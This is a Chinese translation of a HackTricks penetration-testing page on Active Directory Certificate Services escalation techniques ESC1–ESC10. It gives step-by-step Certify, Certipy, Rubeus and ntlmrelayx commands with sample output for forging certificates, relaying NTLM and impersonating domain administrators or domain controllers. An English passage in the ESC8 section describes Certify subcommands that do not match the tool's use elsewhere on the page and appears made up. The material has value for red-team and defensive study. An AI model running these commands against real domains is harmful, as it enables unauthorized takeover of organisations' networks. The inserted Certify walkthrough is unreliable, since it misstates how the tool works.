# AD CS域提升

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 错误配置的证书模板 - ESC1

### 解释

* **企业CA**授予**低权限用户注册权限**
* **禁用了经理批准**
* **不需要授权签名**
* 过于宽松的**证书模板**安全描述符**授予低权限用户证书注册权限**
* **证书模板定义了启用身份验证的EKU**：
* _客户端身份验证（OID 1.3.6.1.5.5.7.3.2），PKINIT客户端身份验证（1.3.6.1.5.2.3.4），智能卡登录（OID 1.3.6.1.4.1.311.20.2.2），任何用途（OID 2.5.29.37.0），或无EKU（子CA）_
* **证书模板允许请求者在CSR中指定subjectAltName：**
* **AD**将使用由证书的**subjectAltName**（SAN）字段指定的身份**（如果存在）**。因此，如果请求者可以在CSR中指定SAN，请求者可以**以任何人的身份请求证书**（例如，域管理员用户）。证书模板的AD对象**指定**请求者是否可以在其**`mspki-certificate-name-`**`flag`属性中指定SAN。`mspki-certificate-name-flag`属性是一个**位掩码**，如果**存在****`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`**标志，请求者可以指定SAN。

{% hint style="danger" %}
这些设置允许**低权限用户使用任意SAN请求证书**，从而允许低权限用户通过Kerberos或SChannel以任何主体在域中进行身份验证。
{% endhint %}

通常情况下，这是启用的，例如，允许产品或部署服务生成HTTPS证书或即时生成主机证书。或者是由于缺乏知识。

请注意，当创建具有此最后选项的证书时，会出现**警告**，但如果**复制**具有此配置的**证书模板**（例如具有启用`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`的`WebServer`模板），则不会出现警告，然后管理员可能会添加身份验证OID。

### 滥用

要**查找易受攻击的证书模板**，可以运行：
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
为了滥用这个漏洞来冒充管理员，可以运行以下命令：
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```
然后，您可以将生成的证书转换为 `.pfx` 格式，并再次使用 Rubeus 或 certipy 进行身份验证：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows二进制文件"Certreq.exe"和"Certutil.exe"可以被滥用来生成PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

此外，当针对AD Forest的配置模式运行以下LDAP查询时，可以用于**枚举****不需要批准/签名**的**证书模板**，这些模板具有**客户端身份验证或智能卡登录EKU**，并且启用了**`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`**标志：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 错误配置的证书模板 - ESC2

### 解释

第二种滥用场景是第一种的变体：

1. 企业 CA 授予低权限用户注册权限。
2. 管理员批准被禁用。
3. 不需要授权签名。
4. 过于宽松的证书模板安全描述符授予低权限用户证书注册权限。
5. **证书模板定义了任意用途的 EKU 或没有 EKU。**

**任意用途的 EKU** 允许攻击者获取用于客户端身份验证、服务器身份验证、代码签名等 **任何用途的证书**。可以使用与 ESC3 相同的技术来滥用此功能。

**没有 EKU 的证书** - 一个下级 CA 证书 - 也可以滥用为 **任何用途**，但还可以用于签署新证书。因此，使用下级 CA 证书，攻击者可以在新证书中指定任意的 EKU 或字段。

然而，如果 **下级 CA 未被`NTAuthCertificates`对象信任**（默认情况下不会被信任），攻击者将无法创建适用于 **域身份验证** 的新证书。尽管如此，攻击者仍然可以创建具有任何 EKU 和任意证书值的新证书，其中有很多潜在的滥用可能性（例如，代码签名、服务器身份验证等），并且可能对网络中的其他应用程序（如 SAML、AD FS 或 IPSec）产生重大影响。

以下 LDAP 查询在针对 AD Forest 的配置模式运行时，可用于枚举与此场景匹配的模板：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 错误配置的注册代理模板 - ESC3

### 解释

这种情况与第一种和第二种情况类似，但滥用了不同的 EKU（证书请求代理）和 2 种不同的模板（因此有 2 组要求）。

在 Microsoft 文档中，被称为“Enrollment Agent”的**证书请求代理 EKU**（OID 1.3.6.1.4.1.311.20.2.1）允许主体代表另一个用户**申请证书**。

**“注册代理”**在这样一个**模板**中注册，并使用生成的**证书来共同签署代表其他用户的 CSR**。然后，它将**共同签署的 CSR**发送给 CA，在允许“代表申请”的**模板**中注册，并且 CA 会响应一个属于“其他”用户的**证书**。

**要求 1：**

1. 企业 CA 允许低权限用户拥有注册权限。
2. 管理员批准已禁用。
3. 不需要授权签名。
4. 过于宽松的证书模板安全描述符允许低权限用户拥有证书注册权限。
5. **证书模板定义了证书请求代理 EKU**。证书请求代理 OID（1.3.6.1.4.1.311.20.2.1）允许代表其他主体请求其他证书模板。

**要求 2：**

1. 企业 CA 允许低权限用户拥有注册权限。
2. 管理员批准已禁用。
3. **模板模式版本为 1 或大于 2，并指定了一个应用策略发行要求，要求证书请求代理 EKU。**
4. 证书模板定义了一个允许域身份验证的 EKU。
5. CA 上未实施注册代理限制。

### 滥用

您可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 滥用这种情况：
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
企业CA可以通过打开`certsrc.msc`快捷方式->右键单击CA->点击属性->导航到“Enrollment Agents”选项卡来**限制**可以**获取**注册代理证书的**用户**，注册代理可以**注册的模板**以及注册代理可以代表的**帐户**。

然而，默认的CA设置是“**不限制注册代理**”。即使管理员启用了“限制注册代理”，默认设置也非常宽松，允许任何人以任何身份访问所有模板。

## 可被攻击的证书模板访问控制 - ESC4

### **解释**

**证书模板**具有指定AD **主体**对模板具有特定**权限**的**安全描述符**。

如果**攻击者**具有足够的**权限**来**修改**模板并从**前面的部分**中**创建**任何可利用的**配置错误**，则他将能够利用它并**提升权限**。

证书模板的有趣权限：

* **所有者：**隐式完全控制对象，可以编辑任何属性。
* **FullControl：**完全控制对象，可以编辑任何属性。
* **WriteOwner：**可以将所有者修改为受攻击者控制的主体。
* **WriteDacl：**可以修改访问控制以授予攻击者FullControl。
* **WriteProperty：**可以编辑任何属性。

### 滥用

类似于前面的特权升级的示例：

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4是指用户对证书模板具有写权限。例如，可以滥用此权限来覆盖证书模板的配置，使模板易受ESC1攻击。

如上所示的路径中，只有`JOHNPC`具有这些权限，但我们的用户`JOHN`具有到`JOHNPC`的新的`AddKeyCredentialLink`边缘。由于此技术与证书相关，我也实现了这种攻击，即[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。这是Certipy的`shadow auto`命令的一小部分，用于检索受害者的NT哈希。

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy**可以通过一个命令覆盖证书模板的配置。默认情况下，Certipy将覆盖配置以使其易受ESC1攻击。我们还可以指定`-save-old`参数来保存旧的配置，这在攻击后恢复配置时非常有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 可被攻击的PKI对象访问控制 - ESC5

### 解释

与AD CS安全相关的互连ACL关系网络非常广泛。除了证书模板和证书颁发机构本身之外，还有一些**对象可以对整个AD CS系统的安全产生影响**。这些可能性包括（但不限于）：

* **CA服务器的AD计算机对象**（例如，通过S4U2Self或S4U2Proxy进行妥协）
* **CA服务器的RPC/DCOM服务器**
* 容器`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`中的任何**后代AD对象或容器**（例如，证书模板容器、证书颁发机构容器、NTAuthCertificates对象、Enrollment Services容器等）

如果低权限的攻击者能够**控制其中任何一个**，攻击很可能会**危及PKI系统**。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 解释

还有另一个类似的问题，描述在[CQure Academy的文章](https://cqureacademy.com/blog/enhanced-key-usage)中，涉及到**`EDITF_ATTRIBUTESUBJECTALTNAME2`**标志。正如微软所描述的，“**如果**在CA上**设置了**此标志，**任何请求**（包括从Active Directory®构建主体时）都可以在**主体备用名称**中具有**用户定义的值**。”\
这意味着**攻击者**可以在**任何配置为域**身份验证的模板中注册（例如，默认的用户模板），并获得一个允许我们以域管理员（或**任何其他活动用户/机器**）身份进行身份验证的证书。

**注意**：这里的**备用名称**通过`certreq.exe`的`-attrib "SAN:"`参数（即“名称值对”）包含在CSR中。这与在ESC1中滥用SAN的方法**不同**，因为它**将帐户信息存储在证书属性中而不是证书扩展中**。

### 滥用

组织可以使用以下`certutil.exe`命令**检查是否启用了该设置**：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
在此之下，这只是使用**远程****注册表**，所以下面的命令也可能有效：
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify)和[**Certipy**](https://github.com/ly4k/Certipy)也可以检查此问题，并可用于滥用此错误配置：
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
这些设置可以在任何系统上进行**设置**，假设具有**域管理员**（或等效）权限：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
如果您在环境中找到此设置，可以使用以下方法**移除此标志**：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
在2022年5月的安全更新之后，新的**证书**将具有一个**安全扩展**，其中**嵌入了请求者的`objectSid`属性**。对于ESC1，此属性将从指定的SAN中反映出来，但对于**ESC6**，此属性反映的是请求者的`objectSid`，而不是来自SAN。\
因此，**要滥用ESC6**，环境必须**容易受到ESC10的攻击**（弱证书映射），其中**SAN优先于新的安全扩展**。
{% endhint %}

## 可被攻击的证书颁发机构访问控制 - ESC7

### 攻击1

#### 解释

证书颁发机构本身具有一组权限，用于保护各种CA操作。可以通过`certsrv.msc`访问这些权限，右键单击CA，选择属性，然后切换到安全选项卡：

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

也可以通过[PSPKI模块](https://www.pkisolutions.com/tools/pspki/)的`Get-CertificationAuthority | Get-CertificationAuthorityAcl`进行枚举：
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
这里的两个主要权限是**`ManageCA`**权限和**`ManageCertificates`**权限，分别对应“CA管理员”和“证书管理员”。

#### 滥用

如果你有一个拥有**证书颁发机构**上的**`ManageCA`**权限的主体，我们可以使用**PSPKI**远程翻转**`EDITF_ATTRIBUTESUBJECTALTNAME2`**位，以允许在任何模板中指定SAN（[ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)）：

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

这也可以通过[**PSPKI的Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx)命令来简化实现。

**`ManageCertificates`**权限允许**批准待处理请求**，从而绕过“CA证书管理员批准”保护。

你可以使用**Certify**和**PSPKI**模块的组合来请求证书、批准证书并下载证书：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### 攻击2

#### 解释

{% hint style="warning" %}
在**之前的攻击**中，使用了**`Manage CA`**权限来**启用**`EDITF\_ATTRIBUTESUBJECTALTNAME2`标志以执行**ESC6攻击**，但在CA服务（`CertSvc`）重新启动之前，这不会产生任何效果。当用户具有`Manage CA`访问权限时，用户也被允许**重新启动服务**。然而，这并不意味着用户可以远程重新启动服务。此外，由于2022年5月的安全更新，**在大多数已打补丁的环境中，ESC6可能无法直接使用**。
{% endhint %}

因此，这里提出了另一种攻击方法。

先决条件：

* 只有**`ManageCA`权限**
* **`Manage Certificates`**权限（可以从**`ManageCA`**授予）
* 必须启用证书模板**`SubCA`**（可以从**`ManageCA`**启用）

该技术依赖于具有`Manage CA`和`Manage Certificates`访问权限的用户可以**发出失败的证书请求**。**`SubCA`**证书模板**容易受到ESC1攻击**，但**只有管理员**可以在模板中注册。因此，**用户**可以**请求**注册**`SubCA`**，然后被**管理员**拒绝，但**之后由管理员签发**。

#### 滥用

您可以通过将您的用户添加为新的官员来**授予自己`Manage Certificates`**访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`**模板可以使用`-enable-template`参数在CA上启用。默认情况下，`SubCA`模板已启用。
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已经满足了这次攻击的前提条件，我们可以开始**基于`SubCA`模板请求证书**。

**这个请求将会被拒绝**，但是我们会保存私钥并记录请求ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
通过我们的**`Manage CA`和`Manage Certificates`**，我们可以使用`ca`命令和`-issue-request <request ID>`参数来**发出失败的证书**请求。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用`req`命令和`-retrieve <request ID>`参数**检索已发行的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay到AD CS HTTP端点 - ESC8

### 解释

{% hint style="info" %}
简而言之，如果一个环境中安装了**AD CS**，以及一个**存在漏洞的Web注册端点**和至少一个允许**域计算机注册和客户端身份验证**的**证书模板**（如默认的**`Machine`**模板），那么攻击者可以**入侵任何运行打印机服务的计算机**！
{% endhint %}

AD CS支持通过安装其他AD CS服务器角色来实现多种**基于HTTP的注册方法**。这些基于HTTP的证书注册接口都是**易受NTLM中继攻击**的。使用NTLM中继，攻击者可以在**受损的计算机上冒充任何入站NTLM身份验证的AD帐户**。在冒充受害者帐户的同时，攻击者可以访问这些Web接口，并**基于`User`或`Machine`证书模板请求客户端身份验证证书**。

* **Web注册接口**（一个外观较旧的ASP应用程序，可通过`http://<caserver>/certsrv/`访问），默认仅支持HTTP，无法防止NTLM中继攻击。此外，它明确只允许通过其Authorization HTTP头进行NTLM身份验证，因此无法使用更安全的协议如Kerberos。
* **证书注册服务**（CES）、**证书注册策略**（CEP）Web服务和**网络设备注册服务**（NDES）默认支持通过其Authorization HTTP头进行协商身份验证。协商身份验证**支持**Kerberos和**NTLM**；因此，在中继攻击期间，攻击者可以**协商到NTLM**身份验证。这些Web服务默认启用了HTTPS，但不幸的是，仅有HTTPS本身**无法防止NTLM中继攻击**。只有当HTTPS与通道绑定结合使用时，HTTPS服务才能免受NTLM中继攻击的影响。不幸的是，AD CS没有在IIS上启用扩展身份验证保护，这是启用通道绑定所必需的。

NTLM中继攻击的常见问题是**NTLM会话通常很短**，并且攻击者**无法**与**强制执行NTLM签名**的服务进行交互。

然而，滥用NTLM中继攻击以获取用户证书可以解决这些限制，因为会话将持续到证书有效期结束，并且证书可以用于使用**强制执行NTLM签名**的服务。要了解如何使用窃取的证书，请查看：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM中继攻击的另一个限制是**需要一个受害者帐户对攻击者控制的计算机进行身份验证**。攻击者可以等待或尝试**强制**它：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **滥用**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify)的`cas`命令可以枚举**已启用的HTTP AD CS端点**：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

企业CA还将**CES端点**存储在其AD对象的`msPKI-Enrollment-Servers`属性中。**Certutil.exe**和**PSPKI**可以解析和列出这些端点：
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### 滥用 Certify

Certify is a Windows tool that allows users to manage certificates. It can be abused to escalate privileges in an Active Directory environment.

##### 1. Obtain a certificate signing request (CSR)

To abuse Certify, you first need to obtain a certificate signing request (CSR). This can be done by generating a CSR using the `certreq` command or by extracting an existing CSR from a certificate.

##### 2. Import the CSR into Certify

Next, import the CSR into Certify using the `certify import` command. This will create a new certificate entry in Certify's database.

##### 3. Sign the certificate

After importing the CSR, sign the certificate using Certify's `certify sign` command. This will generate a signed certificate that can be used for authentication.

##### 4. Export the certificate

Once the certificate is signed, export it using the `certify export` command. This will create a .pfx file containing the certificate and its private key.

##### 5. Import the certificate into the user's personal store

Finally, import the certificate into the user's personal store using the `certutil` command. This will allow the user to use the certificate for authentication and potentially escalate privileges.

By abusing Certify in this way, an attacker can gain unauthorized access to resources and escalate their privileges within an Active Directory environment.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### 使用[Certipy](https://github.com/ly4k/Certipy)进行滥用

默认情况下，Certipy将根据中继账户名称是否以`$`结尾来请求基于`Machine`或`User`模板的证书。可以使用`-template`参数指定其他模板。

然后，我们可以使用类似[PetitPotam](https://github.com/ly4k/PetitPotam)的技术来强制进行身份验证。对于域控制器，我们必须指定`-template DomainController`。
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 无安全扩展 - ESC9 <a href="#5485" id="5485"></a>

### 解释

ESC9指的是新的**`msPKI-Enrollment-Flag`**值**`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）。如果证书模板上设置了此标志，将不会嵌入新的**`szOID_NTDS_CA_SECURITY_EXT`安全扩展**。ESC9仅在`StrongCertificateBindingEnforcement`设置为`1`（默认值）时有用，因为较弱的Kerberos或Schannel证书映射配置可以被滥用为ESC10 - 在没有ESC9的情况下 - 因为要求是相同的。

* `StrongCertificateBindingEnforcement`未设置为`2`（默认值：`1`）或`CertificateMappingMethods`包含`UPN`标志
* 证书在`msPKI-Enrollment-Flag`值中包含`CT_FLAG_NO_SECURITY_EXTENSION`标志
* 证书指定任何客户端身份验证EKU
* 对任何帐户A的`GenericWrite`以妥协任何帐户B

### 滥用

在这种情况下，`John@corp.local`对`Jane@corp.local`具有`GenericWrite`权限，我们希望妥协`Administrator@corp.local`。`Jane@corp.local`被允许在指定了`msPKI-Enrollment-Flag`值中的`CT_FLAG_NO_SECURITY_EXTENSION`标志的证书模板`ESC9`中注册。

首先，我们使用Shadow Credentials（使用我们的`GenericWrite`）获取`Jane`的哈希。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

接下来，我们将`Jane`的`userPrincipalName`更改为`Administrator`。注意，我们省略了`@corp.local`部分。

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

这不是违反约束，因为`Administrator`用户的`userPrincipalName`是`Administrator@corp.local`而不是`Administrator`。

现在，我们请求易受攻击的证书模板`ESC9`。我们必须以`Jane`的身份请求证书。

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

注意证书中的`userPrincipalName`是`Administrator`，而发行的证书不包含“对象SID”。

然后，我们将`Jane`的`userPrincipalName`更改回其他内容，比如她原来的`userPrincipalName` `Jane@corp.local`。

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

现在，如果我们尝试使用该证书进行身份验证，我们将收到`Administrator@corp.local`用户的NT哈希。由于证书中没有指定域，您需要在命令行中添加`-domain <domain>`。

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## 弱证书映射 - ESC10

### 解释

ESC10指的是域控制器上的两个注册表键值。

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`。默认值为`0x18`（`0x8 | 0x10`），先前为`0x1F`。

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`。默认值为`1`，先前为`0`。

**情况1**

`StrongCertificateBindingEnforcement`设置为`0`

**情况2**

`CertificateMappingMethods`包含`UPN`位（`0x4`）

### 滥用情况1

* `StrongCertificateBindingEnforcement`设置为`0`
* 对任何帐户A的`GenericWrite`以妥协任何帐户B

在这种情况下，`John@corp.local`对`Jane@corp.local`具有`GenericWrite`权限，我们希望妥协`Administrator@corp.local`。滥用步骤与ESC9几乎相同，只是可以使用任何证书模板。

首先，我们使用Shadow Credentials（使用我们的`GenericWrite`）获取`Jane`的哈希。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

接下来，我们将`Jane`的`userPrincipalName`更改为`Administrator`。注意，我们省略了`@corp.local`部分。

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

这不是违反约束，因为`Administrator`用户的`userPrincipalName`是`Administrator@corp.local`而不是`Administrator`。

现在，我们请求任何允许客户端身份验证的证书，例如默认的`User`模板。我们必须以`Jane`的身份请求证书。

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

注意证书中的`userPrincipalName`是`Administrator`。

然后，我们将`Jane`的`userPrincipalName`更改回其他内容，比如她原来的`userPrincipalName` `Jane@corp.local`。

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

现在，如果我们尝试使用该证书进行身份验证，我们将收到`Administrator@corp.local`用户的NT哈希。由于证书中没有指定域，您需要在命令行中添加`-domain <domain>`。

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### 滥用情况2

* `CertificateMappingMethods`包含`UPN`位标志（`0x4`）
* 对任何帐户A的`GenericWrite`以妥协没有`userPrincipalName`属性的任何帐户B（机器帐户和内置域管理员`Administrator`）

在这种情况下，`John@corp.local`对`Jane@corp.local`具有`GenericWrite`权限，我们希望妥协域控制器`DC$@corp.local`。

首先，我们使用Shadow Credentials（使用我们的`GenericWrite`）获取`Jane`的哈希。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

接下来，我们将`Jane`的`userPrincipalName`更改为`DC$@corp.local`。

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

这不是违反约束，因为`DC$`计算机帐户没有`userPrincipalName`。

现在，我们请求任何允许客户端身份验证的证书，例如默认的`User`模板。我们必须以`Jane`的身份请求证书。

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
然后，我们将`Jane`的`userPrincipalName`更改回其他值，比如她原来的`userPrincipalName`（`Jane@corp.local`）。

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

现在，由于这个注册表键适用于Schannel，我们必须使用证书通过Schannel进行身份验证。这就是Certipy的新`-ldap-shell`选项的用途。

如果我们尝试使用证书和`-ldap-shell`进行身份验证，我们会注意到我们被认证为`u:CORP\DC$`。这是服务器发送的一个字符串。

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

LDAP shell的可用命令之一是`set_rbcd`，它将在目标上设置基于资源的受限委派（RBCD）。因此，我们可以执行RBCD攻击来入侵域控制器。

